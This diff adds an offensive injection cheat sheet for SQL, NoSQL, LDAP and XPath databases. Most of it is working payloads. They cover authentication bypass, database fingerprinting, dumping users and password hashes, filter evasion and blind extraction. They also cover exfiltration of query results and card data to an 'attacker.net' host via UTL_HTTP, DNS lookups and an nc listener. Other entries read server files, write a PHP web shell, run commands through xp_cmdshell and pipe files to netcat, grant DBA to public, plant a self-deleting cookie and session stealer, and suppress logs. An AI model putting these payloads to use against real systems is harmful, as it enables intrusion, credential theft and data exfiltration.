@@ -1,0 +1,344 @@
+escapes and stuff:
+try anywhere
+	'--
+	'#
+	'/*
+ms-sql maybe:
+	')
+nosql (mongo uses javascript!)
+	' //
+	'; return '' == '
+	1},{a:/.*/
+	page.php?param[name]=val   #can be param=array('name'=>'val');  db.param.find({name:value});
+	ie page.php?user=name&pswd=pass try page.php?user[$gt]=&pswd[$gt]= 
+		for db.param.find({user:{"$gt":undefined}, pswd:{"$gt":undefined}});
+postgre:
+	$$ or %0 maybe:
+msaccess or XPath: no comment for you. complete quotes.  try a null byte in burp though.
+ldap: 	burp a null byte or literal %00 might work
+	')))))) (just to try to see what completes)
+	)(cn=*
+	*))(|(cn=*
+	*))%00
+
+fingerprint db engine:
+string concatination:
+Oracle and postgre: ‘str’||’ing’
+MS-SQL: 'str'+'ing'
+MySQL: 'str' 'ing' #note space
+
+postgre: a' OR 1::int=1  #try a cast
+
+for injections in numberic data will return 0 for right db, else error 
+Oracle: BITAND(1,1)-BITAND(1,1)
+MS-SQL: @@PACK_RECEIVED-@@PACK_RECEIVED--
+MySQL: CONNECTION_ID()-CONNECTION_ID()#
+
+may allow stacked questies:
+ms-sql
+oracle
+postgre
+
+
+get version:
+mysql & ms-sql: SELECT @@version
+mysql & postgre:SELECT version()
+oracle: 	SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';
+ 		SELECT version FROM v$instance; 
+sqlite:		sqlite_version();
+
+get dbs:
+oracle:		SELECT instance_name FROM v$instance;
+		SELECT SYS_CONTEXT(‘USERENV’,’DB_NAME’) FROM dual
+mysql:		SELECT database()
+		SELECT schema_name FROM information_schema.schemata;
+postgre: 	SELECT current_database()
+		SELECT pg_read_file('global/pg_database',0,10000000)#all dbs
+mssql:		SELECT db_name()#or db_name(1), db_name(2)
+		SELECT name FROM master..sysdatabases;
+
+get hostname:
+mysql:		SELECT @@hostname
+
+get user/passwords:
+oracle:
+		SELECT user FROM dual
+		Select Sys.login_user from dual SELECT user FROM dual SYS_CONTEXT(‘USERENV’,‘SESSION_USER’)
+		' and 1=ctxsys.drithsx.sn(1,(select user from dual))--#11g error based
+mysql:		select user()
+		select system_user()
+		SELECT * FROM 'user' WHERE 1 LIMIT 0,30
+		SELECT * FROM mysql.user WHERE 1 LIMIT 1,1
+		SELECT user, password FROM mysql.user
+mssql:		SELECT user_name();
+ 		SELECT system_user;
+ 		SELECT user;
+		SELECT name FROM master..syslogins
+ 		SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID
+		2000: SELECT name FROM master..syslogins
+		2005: SELECT name, password_hash FROM master.sys.sql_logins
+postgresql: 	SELECT user, current_user, session_user; 
+		SELECT usename FROM pg_user; 
+		SELECT getpgusername();
+		SELECT pg_read_file('global/pg_auth',0,10000000);#password column too
+
+		
+
+Get table schema:
+mysql: 	
+	NULL' UNION SELECT table_name,2,3 FROM information_schema.tables;--
+	NULL' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='<from above>';#
+ms-sql:	NULL' UNION ALL SELECT name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'tablenameforcolumnnames')
+foreign apps on ms-sql might need language fixed as example: 
+	NULL' UNION ALL SELECT name COLLATE SQL_Latin1_General_Cp1254_CS_AS,2,3 FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'tablenameforcolumnnames')
+tables from other dbs in mssql:	
+	SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable';
+oracle:
+	SELECT table_name,column_name FROM all_tab_columns #gets current db schema
+sqllite:
+	a' union select name, NULL, NULL from sqlite_master--
+msaccess (no comment for you):
+	a' UNION SELECT '1','2',[Name] FROM MSysObjects WHERE NAME NOT LIKE 'MSys*
+
+
+
+
+group concat records to one col:
+MySQL: SELECT GROUP_CONCAT(user,’:’,pswd) from users 
+#this limits string size returned since (?). Do stuff like:
+ SELECT GROUP_CONCAT(column_name,':',table_name) FROM (SELECT * FROM COLUMNS LIMIT 800,50) AS a;
+Oracle: SELECT wm_concat(table_name||’:’||column_name) FROM all_tab_columns; #no logic as to when this is available found yet
+	SELECT field1,RTRIM(REPLACE(REPLACE(XMLAgg(XMLElement("x", field2) ORDER BY field2), '<x>'), '</x>', ' ')) AS field2s FROM yourTable GROUP BY field1
+	SELECT LISTAGG(user, ':'||pass||':') WITHIN GROUP (ORDER BY 1) "columnalias" FROM users #11g
+	SELECT a, COLLECT(b) FROM someTable GROUP BY a #maybe even rarely
+MS-SQL: SELECT s = STUFF((SELECT ',' + user+':'+pswd FROM dbo.s FOR XML PATH(''), TYPE).value('.', 'VARCHAR(MAX)'), 1, 2, '') 
+	SELECT s = STUFF(CAST((SELECT [text()] = ', '+user+':'+pswd FROM dbo.s FOR XML PATH(''), TYPE) AS VARCHAR(MAX)), 1, 2, '')   
+
+filter evasion stuff:
+
+ascii to char:
+mysql: char(39)
+mssql or postgres: chr(39)
+hex to char:
+mysql: 0x27
+postgre: $$string$$ = 'string' = $abc$string$abc$
+
+if comments blocked or not used like in msaccess: 
+	complete quotes: ' or 'a'='a
+	for some server sides try null byte in burp
+
+if spaces blocked:
+SELECT/*foo*/username,password/*foo*/FROM/*foo*/users
+
+in mysql can also do:
+SEL/*foo*/ECT username,password FR/*foo*/OM users
+
+mysql php script to get around my_real_escape_string, occasionally parameterized and more filters if they don't prevent gbk encoded chars:
+<?php
+	$url="http://www.--------.php";
+	$ref="http://www.----.index.php";
+	$session="PHPSESSID=-------------------";
+	$ch = curl_init();
+	curl_setopt($ch, CURLOPT_URL,$url);
+	curl_setopt($ch, CURLOPT_REFERER,$ref);
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER,TRUE);
+	curl_setopt($ch, CURLOPT_COOKIE,$session);
+	curl_setopt($ch, CURLOPT_POST,TRUE);
+	curl_setopt($ch, CURLOPT_POSTFIELDS,"username=" .chr(0xbf).chr(0x27)." OR 1=1/*&submit=1" );
+ 	$data = curl_exec($ch);
+	echo $data;
+	curl_close($ch);
+?>
+postgre  function to exec any base 64 encoded string sent:
+CREATE FUNCTION DecEcex(VARCHAR) //or CHARACHTER VARYING
+BEGIN
+	EXECUTE decode($1, $hi$base64$hi$);
+	RETURN 0;
+END;
+$$ LANGUAGE $$plpgsql$$;
+
+use conditionals if you can only inject an order:
+oracle:	sort=(select%201/0%20from%20dual%20where%20(select%20substr(max(object_name),1,1)%20FROM%20user_objects)=’Y’)
+or other places use form:SELECT 1/0 FROM dual WHERE (SELECT username FROM all_users WHERE username =‘AAAAAA’) = ‘AAAAAA’ #return error if 1/0 is executed means user AAAAAA doesn't exist
+
+blind injections:
+ms-sql: if ASCII(SUBSTRING(‘Admin’,1,1)) > 105 waitfor delay ‘0:0:5’
+	;DECLARE @x as int;DECLARE @w as char(6);SET @x=ASCII(SUBSTRING(({INJECTION}),1,1));IF @x=100 SET @w='0:0:10' ELSE SET @w='0:0:01';WAITFOR DELAY @w--
+mysql (above vs. 5?): select if(user() like ‘root@%’, sleep(5000), ‘false’)
+mysql (older): select if(user() like ‘root@%’, benchmark(50000,sha1(‘test’)), ‘false’)
+postgresql: SELECT CASE WHEN (COALESCE(ASCII(SUBSTR(({INJECTION}),1,1)),0) > 100) THEN pg_sleep(14) ELSE pg_sleep(0) END LIMIT 1--
+postgre: IF(SELECT * FROM user WHERE uname LIKE pass) THEN PG_SLEEP(10); ELSE PG_SLEEP(0);
+oracle: try to use timeout server requests:
+	a’||Utl_Http.request('http://somethingimadeup.com') FROM dual WHERE (SELECT username FROM all_users WHERE username = 'admin') = 'admin'
+base for xpath brute script:
+	a' or substring(//address[position()=1]/child::node()[position()=6]/text(),1,1)= 'M' and 'a'='a
+noSql:	test for: test/app.php?id=a'return(true);var%20a='b #or false
+noSql base for blind collection dump script:	
+	fuzz number of collections: test/app.php?id=a'return(db.getCollectionNames().length >2);var%20a='b
+	their names: return(db.getCollectionNames()[0].length == 1);	
+		     return(db.getCollectionNames()[0][0] == 'a');
+	num of documents in each: return(db.CN.find().length > 1);
+	each doc length: return(tojsononeline(db.foo.find()[0]).length >100); #tojsononeline as all can be different structure
+	then the chars from docs: return(tojsononeline(db.foo.find()[0])[0] == 'a');	
+
+
+getting string data from int data holes:
+oracle: ASCII(SUBSTR(username,1,1)) #returns ascii for first letter
+mysql & ms-sql: ASCII(SUBSTRING(username,1,1)) #return ascii for first letter
+postgress:  cast(SUBSTRING(getpgusername(),1,1) as numeric)
+xpath works too!: ' or //address[surname/text()=’sumdumbguy’ and substring(password/text(),1,1)=
+'M'] and 'a'='a
+
+string concat to extract 1x1 column data:
+oracle: foo’ || (SELECT 1 FROM dual WHERE (SELECT username FROM users WHERE username = 'example') = 'example')--
+mysql: a' (SELECT username FROM users WHERE username='example' LIMIT 1)
+
+Export data:
+oracle - see UTL_HTTP/UTL_INADDR/UTL_SMTP/UTL_TCP packages:
+	send query results to atacker server with HTTP request: 
+	’||UTL_HTTP.request(‘attacker.net:80/’||(SELECT%20username%20FROM%20all_users%20WHERE%20ROWNUM%3d1))--
+	then netcat up a listener: 
+	nc -nLp 80
+	GET /SYS HTTP/1.1
+	Host: attacker.net
+	Connection: close	
+
+	’ and (select sum(length(utl_http.request('http://example.com/'||num||'.'||exp_date))) from cards)>0--
+	through dns requests to attackers server:
+	’||UTL_INADDR.GET_HOST_NAME((SELECT%20PASSWORD%20FROM%20DBA_USERS%20WHERE%20NAME=’SYS’)||’.attacker.net’)
+	#sends: passwordhash.attacker.net
+	more likely on later versions (where-past 11g?)
+	SYS.DBMS_LDAP.INIT((SELECT PASSWORD FROM SYS.USER$ WHERE NAME=’SYS’)||’.attacker.net’,80)
+
+Ms-sql:
+On really old:
+	insert into openrowset('SQLOLEDB','DRIVER={SQL Server};SERVER=attacker.net,80;UID=sa;PWD=letmein','select * from table_to_steal') values (@@version)
+
+mysql: use outfile (reqs literal quote :( )with use an SMB share:
+	select * into outfile '\\\\attacker.net\\share\\output.txt' from users;
+
+
+
+read data from local files:
+mysql:
+	SELECT LOAD_FILE(0x633A5C626F6F742E696E69)#c:\boot.ini
+NULL' UNION SELECT '<html>', '<?php echo "source=".htmlentities(file_get_contents("../forbidden/.htpasswd"));?></html>' INTO OUTFILE '../tmp/----------'#
+postgres if in data directory:
+	SELECT pg_read_file('global/pg_hba.conf',0,10000000);
+postgres otherwise:
+	CREATE TABLE temptable(id serial, t text);
+	COPY temptable(t) FROM '%systemroot%\system32\inetsrv\MetaBase.xml';#IIS 6 location
+	SELECT * FROM temptable  LIMIT 1 OFFSET 0
+	don;t forget DROP TABLE temptable after
+
+
+put data in table
+mssql:
+	Create table foo( line varchar(8000) );
+	bulk insert foo from 'c:\inetpub\wwwroot\login.asp';
+	Drop temp table; 
+
+write file:
+	mysql:	SELECT 1 INTO OUTFILE '../../htdocs/test.php'# needs actual quotes
+	mssql:	bcp "SELECT * FROM test" queryout c:\inetpub\wwwroot\runcommand.asp -c -Slocalhost -Uuser -Ppswd #need credentials first
+	
+show privs
+Oracle: SELECT privilege FROM session_privs
+MS-SQL: SELECT grantee, table_name, privilege_type FROM INFORMATION_SCHEMA.TABLE_PRIVILEGES
+MySQL: 	SELECT user();
+	SELECT * FROM information_schema.user_privileges WHERE grantee = '<the user>'
+
+
+change users and permissions:
+old oracle (pre 11g, maybe more):
+	’ and chr(44)=SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);
+	EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;
+	BEGIN EXECUTE IMMEDIATE '''' grant dba to public'''';END;'';END;--','SYS',0,'1',0)--
+mysql:
+	CREATE USER username IDENTIFIED BY 'password'; --
+	DROP USER username;--
+	GRANT ALL PRIVILEGES ON *.* TO username@'%';
+mssql:	EXEC sp_addlogin 'user', 'pass';
+	EXEC sp_droplogin 'user';
+	EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin;
+postgress:
+	CREATE USER test1 PASSWORD ‘pass1'; -- priv
+	CREATE USER test1 PASSWORD ‘pass1' CREATEUSER; -- priv, grant some privs at the same time
+	DROP USER test1; -- priv
+	ALTER USER test1 CREATEUSER CREATEDB; -- priv
+	add host to the pg_hba.conf file located in the DATA directory to enable remote auth:
+	host     all     all     192.168.20.0/24     md5
+
+
+command execution:
+old mssql 2005 but sometimes later too:
+	EXEC sp_configure 'show advanced options',1
+	RECONFIGURE #or try RECONFIGURE WITH OVERRIDE
+	EXEC sp_configure 'xp_cmdshell',1
+	RECONFIGURE #or try RECONFIGURE WITH OVERRIDE
+	#if still not found error: EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:'
+	EXEC master.dbo.xp_cmdshell ‘ipconfig > temp.txt’
+postgre: SELECT system(‘cat /var/www/----/login.php | nc 10.0.0.1 8080'); -- priv
+postgre: CREATE OR REPLACE FUNCTION sys_exec(cstring) RETURNS int AS ‘/lib/libc.so.6', ‘sys_exec’ LANGUAGE ‘C’ STRICT; -- priv
+postgre: CREATE OR REPLACE FUNCTION sys_exec(cstring) RETURNS text AS ‘/tmp/lib_postgresqludf_sys.so', ‘sys_exec’ LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;
+postgre: ;py:=to_char(\n\timport os\n\tprint(os.system(arg))\n); CREATE OR REPLACE FUNCTION exec(arg text) RETURNS text AS $$/tmp/lib_postgresqludf_sys.so$$ $$py$$ LANGUAGE plpythonu;exec('ipconfig'); #appears good for lots of python
+command execution via shell:
+mysql requires actual single quote for outfile and unprotected dir:
+	NULL UNION ALL SELECT '','','','','<?php exec($_GET["cmd"],$out,$s);foreach ($out as $o){echo $o."<br>";}echo "<br>Status:$s<br>";?>' INTO OUTFILE '/var/www/img/load_imgs.php'#
+	(also  can use and SHELL_EXEC and system)
+sqllite3 if stacked queries: ’; ATTACH DATABASE ‘/var/www/lol.php’ AS lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn (dataz) VALUES (‘<? system($_GET[‘cmd’]); ?>’;--
+sqllite3 otherwise (requires messed up custom settings): SELECT load_extension('host\share\meterpreter.dll', DllMain);
+oracle: see https://dl.packetstormsecurity.net/papers/database/Hacking_Oracle_From_Web_2.pdf 
+
+
+
+other stuff:
+oracle:
+	Stored procedures by default have privs of creator to do stuff like:
+	’ and (Select SYS.KUPP$PROC.CREATE_MASTER_PROCESS('EXECUTE IMMEDIATE ''DECLARE PRAGMA 
+AUTONOMOUS_TRANSACTION; 
+	BEGIN EXECUTE IMMEDIATE ''''GRANT DBA TO PUBLIC''''; END;'';') from dual) is not null--
+mssql:
+	SELECT * FROM master..sysservers#linked servers
+	#change regitry
+	xp_regaddmultistring
+	xp_regdeletekey
+	xp_regdeletevalue
+	xp_regenumkeys
+	xp_regremovemultistring
+	xp_regwrite
+	exec xp_regread HKEY_LOCAL_MACHINE, 'SYSTEM\CurrentControlSet\Services\lanmanserver\parameters', 'nullsessionshares'
+	exec xp_regenumvalues HKEY_LOCAL_MACHINE, 'SYSTEM\CurrentControlSet\Services\snmp\parameters\validcommunities'
+ 	Managing Services: xp_servicecontrol
+	ODBC Resources: xp_enumdsn
+	Login mode: xp_loginconfig
+	Creating Cab Files: xp_makecab
+	Domain Enumeration: xp_ntsec_enumdomains
+	Process Killing: xp_terminate_process <pid>
+	Add new procedure! versons AFTER 08! sp_addextendedproc ‘xp_webserver’, ‘c:\temp\x.dll’  	exec xp_webserver
+	Write text file to a UNC or an internal path: sp_makewebtask
+	shutdown db: ' shutdown--
+	suppress logging:add --sp_password (only affects db logs not app)
+mysql on php:
+	makes a file that writes a session + all session var stealer to page on site when visited and then self destructs (use literal spaces if room):
+NULL UNION SELECT '<html><body><?php echo htmlentities(file_get_contents("login2.php"));$toAdd=file_get_contents("login2.php").\'                                                                                                                                                                   <iframe style="border:0px;width=0px;height:0px;" src=<?php $payload=""; foreach($_COOKIE as $k=>$v){$payload.="%26CV".$k."=".$v;}foreach($_SESSION as $k=>$v){if (is_array($v)){$payload.="%26SA".$k."=ARR";foreach($v as $vk=>$vv){if(is_array($vv)){$payload.="%26SAA".$vk."=AA";foreach($vv as $vvk=>$vvv){$payload.="%26SAV".$vvk."=".$vvv;}}else{$payload.="%26SAV".$vk."=".$vv;}}}else{$payload.="%26SV".$k."=".$v;}} echo "mycatchersite.php?".$payload."></iframe>" ?>\';file_put_contents("product2.php",$toAdd);sleep(20);unlink(__FILE__);?></body></html>','','','','' INTO OUTFILE '../../img/dhhdgogpusdgonsghugi.php'	
+
+ldap:	no conditionals for you, they're in syntax before params like (|(department=London sales)(department=Reading sales))
+	but
+	)(department=*
+	queries: 
+	(|(department=London )(department=*)(department=Reading )(department=*))
+	or on conjuntive: (&(user=test)(department=London *))
+	*))(&(user=test
+	queries:
+	(&(user=*))(&(user=test)(department=London*))
+	also *))%00
+	(&(user=*))[NULL])(department=London*))
+	cn attribute seems always there, try:
+	)(cn=*
+	*))(|(cn=*
+	*))%00
+nosql get list of values from params:
+	http://victim/app.php?param[$regex]=^a. //^ab., ^abc., .., script it 
+nosql ez DDOS:
+	http://victim/app.php?article=a';while(1);var foo='bar #where article is their only get param
